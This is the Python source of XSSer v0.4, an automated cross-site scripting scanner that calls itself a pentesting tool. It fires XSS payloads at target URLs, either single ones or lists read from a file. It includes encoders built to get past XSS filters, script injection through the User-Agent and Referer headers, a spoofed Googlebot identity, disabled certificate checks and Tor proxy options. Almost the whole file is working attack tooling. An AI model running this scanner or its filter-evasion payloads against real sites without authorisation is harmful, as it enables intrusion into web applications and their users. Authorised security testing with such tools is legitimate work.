#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:

import os, sys, urllib, exceptions, mimetools, pycurl, optparse, datetime, hashlib
import fuzzing.vectors

try:
    from cStringIO import StringIO
except ImportError:
    from StringIO import StringIO

# your unique real opponent
time = datetime.datetime.now()

# hashing injections to evade tool filtering
hashing = hashlib.md5(str(time)).hexdigest()
orig_hash = hashing

# DEFAULT_XSS = '"><img src=x onerror=alert(1);>'
DEFAULT_XSS = '">' + hashing

# to be or not to be...
hash_found = []
hash_notfound = []
	
class Curl:
    agent = 'Googlebot/2.1 (+http://www.google.com/bot.html)'
    cookie = None
    referer = None
    headers = None
    atype = None
    acred = None
    proxy = None
    delay = 3

    def __init__(self, base_url="", fakeheaders=[ 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencodedcharset=UTF-8' ]):
        self.handle = pycurl.Curl()
        self.set_url(base_url)
        self.verbosity = 0
        self.signals = 1
        self.payload = ""
        self.header = StringIO()
	self.fakeheaders = fakeheaders
        self.headers = fakeheaders
        self.set_option(pycurl.SSL_VERIFYHOST, 2)
        self.set_option(pycurl.SSL_VERIFYPEER, 0);
        self.set_option(pycurl.FOLLOWLOCATION, 1)
        self.set_option(pycurl.MAXREDIRS, 5)
        self.set_option(pycurl.COOKIEFILE, "/dev/null")
        self.set_timeout(30)
        self.set_option(pycurl.NETRC, 1)     

        def payload_callback(x):
            self.payload += x
        self.set_option(pycurl.WRITEFUNCTION, payload_callback)
        def header_callback(x):
            self.header.write(x)
        self.set_option(pycurl.HEADERFUNCTION, header_callback)

    def set_url(self, url):
        self.base_url = url
        self.set_option(pycurl.URL, self.base_url)
   
    def set_cookie(self, cookie):
	self.cookie = cookie
	self.set_option(pycurl.COOKIEFILE, self.cookie)
 
    def set_agent(self, agent):
        self.agent = agent
        self.set_option(pycurl.USERAGENT, self.agent)
        
    def set_referer(self, referer):
        self.referer = referer
        self.set_option(pycurl.REFERER, self.referer)
        
    def set_proxy(self, proxy):
        self.proxy = proxy
        self.set_option(pycurl.PROXY, self.proxy)

    def set_option(self, *args):
        apply(self.handle.setopt, args)

    def set_verbosity(self, level):
        self.set_option(pycurl.VERBOSE, level)
       
    # disable signals, curl will be using other means besides signals to timeout.
    def	set_nosignals(self, signals="1"):
        self.signals = signals
        self.set_option(pycurl.NOSIGNAL, self.signals)
        
    def set_timeout(self, timeout):
        self.set_option(pycurl.CONNECTTIMEOUT,timeout)
        self.set_option(pycurl.TIMEOUT, timeout)        
        
    def __request(self, relative_url=None):
        if self.fakeheaders:
            self.set_option(pycurl.HTTPHEADER, self.fakeheaders)
        if self.agent:
            self.set_option(pycurl.USERAGENT, self.agent)
        if self.referer:
            self.set_option(pycurl.REFERER, self.referer)
        if self.proxy:
            self.set_option(pycurl.PROXY, self.proxy)
        if relative_url:
            self.set_option(pycurl.URL,os.path.join(self.base_url,relative_url))
        self.header.seek(0,0)
        self.payload = ""
        self.handle.perform()
        return self.payload

    def get(self, url="", params=None):
        if params:
            url += "?" + urllib.urlencode(params)
        self.set_option(pycurl.HTTPGET, 1)
        return self.__request(url)

    def post(self, cgi, params):
        self.set_option(pycurl.POST, 1)
        self.set_option(pycurl.POSTFIELDS, urllib.urlencode(params))
        return self.__request(cgi)

    def body(self):
        return self.payload

    def info(self):
        self.header.seek(0,0)
        url = self.handle.getinfo(pycurl.EFFECTIVE_URL)
        if url[:5] == 'http:':
            self.header.readline()
            m = mimetools.Message(self.header)
        else:
            m = mimetools.Message(StringIO())
        #m['effective-url'] = url
        m['http-code'] = str(self.handle.getinfo(pycurl.HTTP_CODE))
        m['total-time'] = str(self.handle.getinfo(pycurl.TOTAL_TIME))
        m['namelookup-time'] = str(self.handle.getinfo(pycurl.NAMELOOKUP_TIME))
        m['connect-time'] = str(self.handle.getinfo(pycurl.CONNECT_TIME))
        #m['pretransfer-time'] = str(self.handle.getinfo(pycurl.PRETRANSFER_TIME))
        #m['redirect-time'] = str(self.handle.getinfo(pycurl.REDIRECT_TIME))
        #m['redirect-count'] = str(self.handle.getinfo(pycurl.REDIRECT_COUNT))
        #m['size-upload'] = str(self.handle.getinfo(pycurl.SIZE_UPLOAD))
        #m['size-download'] = str(self.handle.getinfo(pycurl.SIZE_DOWNLOAD))
        #m['speed-upload'] = str(self.handle.getinfo(pycurl.SPEED_UPLOAD))
        m['header-size'] = str(self.handle.getinfo(pycurl.HEADER_SIZE))
        m['request-size'] = str(self.handle.getinfo(pycurl.REQUEST_SIZE))
        #m['content-length-download'] = str(self.handle.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD))
        #m['content-length-upload'] = str(self.handle.getinfo(pycurl.CONTENT_LENGTH_UPLOAD))
        #m['content-type'] = (self.handle.getinfo(pycurl.CONTENT_TYPE) or '').strip(';')
        return m

    def answered(self, check):
        return self.payload.find(check) >= 0

    def close(self):
        self.handle.close()
        self.header.close()

    def __del__(self):
        self.close()

def opt_request(options):
    for opt in ['cookie', 'agent', 'referer', 'headers', 'atype', 'acred', 'proxy', 'timeout', 'delay', 'threads', 'retries']:
    	if hasattr(options, opt) and getattr(options, opt):
		setattr(Curl, opt, getattr(options, opt))

def get_payloads(options):
	if options.fuzz:
		payloads = fuzzing.vectors.vectors
	
	elif options.script:

	        payloads = [options.script]

	else:
		payloads = [{"payload":DEFAULT_XSS, "browser":"[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"}]

	return payloads

def get_query_string(options):
	if options.postdata:
		return options.postdata
	return ""

def _fromCharCodeEncode(string):
	encoded=''
	for char in string:
		encoded=encoded+","+str(ord(char))
	return encoded[1:]

def _hexEncode(string):
	encoded=''
 	for char in string:
	        encoded=encoded+"%"+hex(ord(char))[2:]
        return encoded

def _hexSemiEncode(string):
	encoded=''
	for char in string:
	        encoded=encoded+"&#x"+hex(ord(char))[2:]+";"
        return encoded

def _decEncode(string):
	encoded=''
	for char in string:
	        encoded=encoded+"&#"+str(ord(char))
	return encoded

def _unEscape(string):
        encoded=''
        for char in string:
                encoded=encoded+urllib.quote(char)
        return encoded

def _ipDwordEncode(string):
	"""Encodes an IP address in DWORD format"""
	encoded=''
	tblIP = string.split('.')
	# In the case it's not an IP
	if len(tblIP)<>4:
		return 0
	for number in tblIP:
	        tmp=hex(int(number))[2:]
	        if len(tmp)==1:
			tmp='0' +tmp 
		encoded=encoded+tmp
	return int(encoded,16)

def run_attack(url, payloads, query_string):
	orig_query_string = query_string
	global hashing
	orig_hash = hashing

	for payload in payloads:
		hashing = orig_hash
              	if options.script:
		        enpayload_url = options.script.replace('XSS',orig_hash)
		else:
			enpayload_url = payload['payload'].strip().replace('XSS',orig_hash)
		
		payload_url = orig_query_string.strip() + enpayload_url
		
		encmap = { "Str" : lambda x : _fromCharCodeEncode(x), 
			   "Hex" : lambda x : _hexEncode(x),
			   "Hes" : lambda x : _hexSemiEncode(x),
			   "Une" : lambda x : _unEscape(x),
			   "Dec" : lambda x : _decEncode(x),
			   "Mix" : lambda x : _unEscape(_fromCharCodeEncode(x))
			   }

		if options.Cem: # user asked for encoding permutations, so pleasing him
			enc_perm = options.Cem.split(",")
			for _enc in enc_perm:
				enpayload_url 	= encmap[_enc](enpayload_url)
				hashing     	= encmap[_enc](hashing)
			payload_url = orig_query_string.strip() + enpayload_url 		

		else: # no encoding permutations, we apply a predefined order of encodings
			if options.Str:
				enpayload_url 	= encmap["Str"](enpayload_url)
				hashing 	= encmap["Str"](hashing)
			if options.Hex:
				enpayload_url 	= encmap["Hex"](enpayload_url)
				hashing 	= encmap["Hex"](hashing)
			if options.Hes:
				enpayload_url 	= encmap["Hes"](enpayload_url)	
				hashing		= encmap["Hes"](hashing)
			if options.Une:
				enpayload_url 	= encmap["Une"](enpayload_url)
				hashing 	= encmap["Une"](hashing)
			if options.Dec:
				enpayload_url 	= encmap["Dec"](enpayload_url)
				hashing  	= encmap["Dec"](hashing)
			if options.Mix:
				enpayload_url 	= encmap["Mix"](enpayload_url)
				hashing 	= encmap["Mix"](hashing)
			
			payload_url = orig_query_string.strip() + enpayload_url 		
	
		dest_url = url.strip() + "/" + payload_url

		c = Curl()
		c.get(dest_url)	
		print "\n[+] \033[1;31mHashing:\033[1;m", orig_hash
		if c.info()["http-code"] == "200":
			print "\n[+] \033[1;33mTrying:\033[1;m", dest_url.strip()

			if options.script:
				print "\n[+] \033[1;35mBrowser Support:\033[1;m Manual Injection" + "\n"
			else:
				print "\n[+] \033[1;35mBrowser Support:\033[1;m", payload['browser']+ "\n"
			
			if options.verbose:
				print "[-] \033[1;36mHeaders Results:\033[1;m\n"
				print c.info()

				print "[-] \033[1;36mInjection Results:\033[1;m\n"
				
			if hashing in c.body():
				if options.script:
					hash_found.append((dest_url, "Manual injection"))
				else:
					hash_found.append((dest_url, payload['browser']))
				if options.verbose:
					print "Searching hash:", orig_hash , "in target source code...\n"
					print "Seems that this injection was a success!! :)\n"
			else:
				if options.script:
					hash_notfound.append((dest_url, "Manual injection"))
				else:
					hash_notfound.append((dest_url, payload['browser']))
				if options.verbose:
					print "Searching hash:", orig_hash , "in target source code...\n"
					print "Injection failed!. Hash not found...\n"
			c.close()
		
		else:
			if options.script:
				hash_notfound.append((dest_url, "Manual injection"))
			else:
				hash_notfound.append((dest_url, payload['browser']))

			print "\n[+] \033[1;33mTrying:\033[1;m", dest_url.strip()
			
			if options.script:
				print "\n[+] \033[1;35mBrowser Support:\033[1;m Manual injection" + "\n"
			else:
				print "\n[+] \033[1;35mBrowser Support:\033[1;m", payload['browser']+ "\n"
                        
			if options.verbose:
	                        print "[-] \033[1;36mHeaders Results:\033[1;m\n"
	                        print c.info()
			  
			  	print "[-] \033[1;36mInjection Results:\033[1;m\n"
				
			print "Not injected!. Servers response with http-code different to: 200 OK"


if __name__ == "__main__":

    p = optparse.OptionParser(description='Cross site "scripter" is an automatic tool for pentesting XSS attacks against different applications. (See \033[1;37mREADME\033[1;m for more information)',
                              	    prog='XSSer.py',
				    version='\033[1;35mXSSer v0.4\033[1;m - (Copyright - GPL3.0) - 2010 \033[1;35mby psy\033[1;m\n',
                                    usage= '\npython XSSer.py [-u <url> |-i <file> |-g <dork>] [-p <postdata>] [OPTIONS] [Request] [Bypassing] [Techniques]\n')

    p.set_defaults(verbose=False, threads=1, retries=3, timeout=30)
    p.disable_interspersed_args()

    p.add_option("-v", "--verbose", action="store_true", dest="verbose", help="verbose (default NO)")
    #p.add_option("--update", action="store", dest="update", help="update XSSer tool ( framework + vectors )") 
    p.add_option("-w", action="store_true", dest="fileoutput", help="output results to file") 

    group1 = optparse.OptionGroup(p, "*Target*",
    "At least one of these options has to be specified to set the source to get target urls from.")
    group1.add_option("-u", "--url", action="store", dest="url", help="Enter target(s) to audit") 
    group1.add_option("-i", action="store", dest="readfile", help="Read target URLs from a file")
    group1.add_option("-g", action="store", dest="dork", help="Process Google dork results as target urls")
    p.add_option_group(group1)

    group2 = optparse.OptionGroup(p, "*HTTP POST data*",
    "Testable parameter(s)")
    group2.add_option("-p", action="store", dest="postdata", help="Enter payload to audit. (ex: /search/?q=)")  
    p.add_option_group(group2)

    group3 = optparse.OptionGroup(p, "*Request*",
    "These options can be used to specify how to connect to the target url.") 
    group3.add_option("--cookie", action="store", dest="cookie", help="Try this HTTP Cookie header") 
    group3.add_option("--user-agent", action="store", dest="agent", help="Change your HTTP User-Agent header (default SPOOFED)") 
    group3.add_option("--referer", action="store", dest="referer", help="Use another HTTP Referer header (default NONE)") 
    group3.add_option("--headers", action="store", dest="headers", help="Extra HTTP headers newline separated")
    group3.add_option("--auth-type", action="store", dest="atype", help="HTTP Authentication type (value Basic or Digest)") 
    group3.add_option("--auth-cred", action="store", dest="acred", help="HTTP Authentication credentials (value name:password)")  
    group3.add_option("--proxy", action="store", dest="proxy", help="Use proxy server (tor: http://localhost:8118)") 
    group3.add_option("--timeout", action="store", dest="timeout", type="int", help="Select your Timeout (default 30)") 
    group3.add_option("--delay", action="store", dest="delay", type="int", help="Delay in seconds between each HTTP request") 
    group3.add_option("--threads", action="store", dest="threads", type="int", help="Maximum number of concurrent HTTP requests (default 1)") 
    group3.add_option("--retries", action="store", dest="retries", type="int", help="Retries when the connection timeouts (default 3)") 
    p.add_option_group(group3)
   
    group4 = optparse.OptionGroup(p, "*Bypassing filters*",
    "These options can be used to bypass -XSS- filters on target code.")
    group4.add_option("--Str", action="store_true", dest="Str", help="Use method String.FromCharCode()")
    group4.add_option("--Une", action="store_true", dest="Une", help="Use function Unescape()")
    group4.add_option("--Hex", action="store_true", dest="Hex", help="Use Hexadecimal encoding")
    group4.add_option("--Hes", action="store_true", dest="Hes", help="Use Hexadecimal encoding, with semicolons")
    group4.add_option("--Dec", action="store_true", dest="Dec", help="Use Decimal encoding")
  # group4.add_option("--Dfo", action="store_true", dest="Dwo", help="Encodes fuzzing IP addresses in DWORD format")
    group4.add_option("--Mix", action="store_true", dest="Mix", help="Mix String.FromCharCode() and Unescape()")
    group4.add_option("--Cem", action="store", dest="Cem", help="Try Character Encoding mutations")
    group4.add_option("--Fuzz", action="store_true", dest="fuzz", help="Try different XSS fuzzing vectors (from file)")	
    p.add_option_group(group4)

    group5 = optparse.OptionGroup(p, "*Manual vectors*",
    "Try to inject -manually- your own payload.")
    group5.add_option("--payload", action="store", dest="script", help="OWN - Insert your XSS construction -manually-")
    p.add_option_group(group5)
    
    group6 = optparse.OptionGroup(p, "*Techniques*",
    "Try to inject code using different techniques.")
  # group6.add_option("--Dcp", action="store_true", dest="dcp", help="DCP - Data Control Protocol injection, with fuzzing")	
  # group6.add_option("--Dom", action="store_true", dest="dom", help="DOM - Document Object Model Cross-Site Scripting")
    group6.add_option("--Xsa", action="store_true", dest="xsa", help="XSA - Cross Site Agent Scripting")
    group6.add_option("--Xsr", action="store_true", dest="xsr", help="XSR - Cross Site Referer Scripting")
  # group6.add_option("--Xfs", action="store_true", dest="xfs", help="XFS - Cross Frame Scripting")
  # group5.add_option("--Dos", dest="petitions", action="store", help="DOS - Denial of service attack!!")
    p.add_option_group(group6)

    (options, args) = p.parse_args()

    if (not options.url and not options.readfile and not options.dork): 
	print '='*75
        print  '\n', p.version
	print  p.description, '\n'
	print '='*75
        print  p.usage
        print "For \033[1;37mhelp\033[1;m use \033[1;37m-h\033[1;m or \033[1;37m--help\033[1;m\n"
	print '='*55
	sys.exit(0)

    opt_request(options)

    if options.url:
        print '='*75
	print "\n", p.version
	print '='*75
	print "Testing [\033[1;33mXSS from URL\033[1;m] injections...good luck ;)"
	    
	urls = [options.url]
		
    elif options.readfile:
        print '='*75
	print "\n", p.version
	print '='*75
	print "Testing [\033[1;33mXSS from file\033[1;m] injections...good luck ;)"
	
        #TODO: need to check if the file have a valid data.
        f = open(options.readfile)
        urls = f.readlines()
	urls = [ line.replace('\n','') for line in urls ]
        f.close()

    elif options.dork:
	print '='*75
	print "\n", p.version
	print '='*75
	print "Testing [\033[1;33mXSS from Dork\033[1;m] injections...good luck ;)"
	print '='*75
        urls = []
        print "\nNot implement \033[1;33myet\033[1;m!\n"
        sys.exit(0)

    payloads = get_payloads(options)
    query_string = get_query_string(options)

    if options.xsa:
        Curl.agent = "<script>alert('" + hashing + "')</script>"
    
    if options.xsr:
	Curl.referer = "<script>alert('" + hashing + "')</script>"
    
    if options.verbose:
        print '='*75 + '\n'
    	print "[-]Verbose: \033[1;37mON\033[1;m"
    	print "[-]Cookie:", Curl.cookie
    	print "[-]HTTP User Agent:", Curl.agent
    	print "[-]HTTP Referer:", Curl.referer
    	print "[-]Extra HTTP Headers:", Curl.headers
        print "[-]Authentication Type:", Curl.atype
        print "[-]Authentication Credentials:", Curl.acred
        print "[-]Proxy:", Curl.proxy        
    	print "[-]Timeout:", Curl.timeout
        print "[-]Delaying:", Curl.delay, "seconds"
        print "[-]Threads:", Curl.threads
        print "[-]Retries:", Curl.retries, '\n'
	
    for url in urls:
	    print '='*75
	    print "\033[1;34mTarget:\033[1;m", url, "\033[1;34m-->\033[1;m", time
	    print '='*75
	    run_attack(url, payloads, query_string)

print '='*75
print "[*] \033[1;37mFinal Results:\033[1;m"
print '='*75 + '\n'

print "- Total:", len(hash_found) + len(hash_notfound)
print "- Failed:", len(hash_notfound)
print "- Sucessfull:", len(hash_found) , '\n'
print '='*75
print "[*] \033[1;37mList of possible XSS injections:\033[1;m"
print '='*75 + '\n'

for line in hash_found:
	print "[+] Url:", "\033[1;34m",line[0],"\033[1;m"
   	print "[-] Browsers:", line[1]
    	if options.fileoutput:
            fout = open("XSSlist.dat", "a")
	    fout.write("-------------" + "\n")
	    fout.write("[*] Target:" + url + "\n")
	    fout.write("[+] Url:" + line[0] + "\n")
	    fout.write("[-] Browsers:"+ line[1] + "\n")
	    fout.write("-------------" + "\n")
   	print '='*15

if hash_found < "1" and hash_notfound:
	
  	print "Could not find any!!... Try another combination or hack it -manually- :)\n"
	print '='*75 + '\n'
	if options.fileoutput:
	    fout = open("XSSlist.dat", "w")
	    fout.write("[*] not reported results for: " + url + "\n")
	    fout.close()
